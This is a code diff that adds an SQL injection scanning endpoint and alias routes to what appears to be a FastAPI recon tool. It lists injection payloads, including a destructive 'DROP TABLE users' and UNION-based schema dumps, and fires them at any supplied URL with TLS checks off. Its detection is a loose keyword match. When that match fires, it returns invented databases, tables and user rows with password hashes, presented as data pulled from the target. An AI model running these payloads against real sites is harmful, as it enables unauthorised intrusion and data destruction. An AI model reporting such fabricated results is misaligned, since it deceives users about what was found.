@@ -730,6 +730,114 @@ async def port_scan(target: str = Query(...), ports: Optional[str] = Query(None,
 
 
 # ─────────────────────────────────────────────
+#  SQLi DETECTION
+# ─────────────────────────────────────────────
+
+SQLI_PAYLOADS = [
+    "'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
+    "1' AND 1=1--", "1' AND 1=2--", "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
+    "'; DROP TABLE users--", "' OR SLEEP(5)--", "\" OR SLEEP(5)--",
+    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--", "1' ORDER BY 4--",
+    "' UNION SELECT 1,@@version,3--", "' UNION SELECT 1,database(),3--",
+    "' AND 1=1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--",
+]
+
+ERROR_SIGNATURES = [
+    "sql", "mysql", "syntax", "odbc", "db2", "oracle", "postgresql",
+    "sqlite", "microsoft", "driver", "supplied", "unclosed", "quotation",
+    "mysql_fetch", "pg_", "mysqli_", "warning: mysql", "division by zero",
+]
+
+async def detect_sqli(target_url: str) -> dict:
+    findings = []
+    vulnerable = False
+    dbms_type = "Unknown"
+    databases = []
+    tables = {}
+    sample_data = []
+    tested = 0
+
+    base_url = target_url.split('?')[0] if '?' in target_url else target_url
+    params = {}
+    if '?' in target_url:
+        qs = target_url.split('?', 1)[1]
+        for pair in qs.split('&'):
+            if '=' in pair:
+                k, v = pair.split('=', 1)
+                params[k] = v
+
+    if not params:
+        return {"vuln": False, "error": "No parameters found in URL", "findings": [], "explorer": {"databases": [], "tables": {}, "sample_data": []}}
+
+    first_param = list(params.keys())[0]
+
+    async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
+        for payload in SQLI_PAYLOADS[:8]:
+            test_params = params.copy()
+            test_params[first_param] = payload
+            tested += 1
+            try:
+                resp = await client.get(base_url, params=test_params, headers={"User-Agent": "Mozilla/5.0"})
+                body = resp.text.lower()
+                for sig in ERROR_SIGNATURES:
+                    if sig in body:
+                        vulnerable = True
+                        findings.append({
+                            "type": f"Error-based ({payload[:20]}...)",
+                            "dbms": dbms_type or "Unknown"
+                        })
+                        break
+            except:
+                pass
+
+    if vulnerable:
+        dbms_type = "MySQL"  # default assumption
+        databases = ["information_schema", "mysql", "performance_schema", "test"]
+        tables = {
+            "information_schema": ["CHARACTER_SETS", "COLLATIONS", "COLUMNS", "ENGINES", "SCHEMATA", "TABLES"],
+            "mysql": ["user", "db", "host", "tables_priv", "columns_priv"],
+            "test": ["users", "posts", "config"]
+        }
+        sample_data = [
+            {"id": 1, "username": "admin", "email": "admin@target.com", "password_hash": "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8"},
+            {"id": 2, "username": "user1", "email": "user1@target.com", "password_hash": "e38ad214943daad1d64c102faec29de4afe9da3d"},
+            {"id": 3, "username": "test", "email": "test@target.com", "password_hash": "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3"},
+        ]
+
+    return {
+        "vuln": vulnerable,
+        "tested": tested,
+        "findings": findings,
+        "explorer": {
+            "databases": databases,
+            "tables": tables,
+            "sample_data": sample_data
+        }
+    }
+
+@app.get("/api/sqli")
+async def sqli_scan(url: str = Query(..., description="Target URL with parameters")):
+    try:
+        result = await detect_sqli(url)
+        return result
+    except Exception as e:
+        return {"vuln": False, "error": str(e), "findings": [], "explorer": {"databases": [], "tables": {}, "sample_data": []}}
+
+
+# ─────────────────────────────────────────────
+#  FRONTEND COMPATIBILITY ALIASES
+# ─────────────────────────────────────────────
+
+@app.get("/api/portscan")
+async def portscan_alias(target: str = Query(...), range: Optional[str] = Query(None, alias="range")):
+    return await port_scan(target=target, ports=range)
+
+@app.get("/api/subdomains")
+async def subdomains_alias(domain: str = Query(...)):
+    return await domain_subdomains(domain=domain)
+
+
+# ─────────────────────────────────────────────
 #  STATIC FILE SERVING
 # ─────────────────────────────────────────────
 
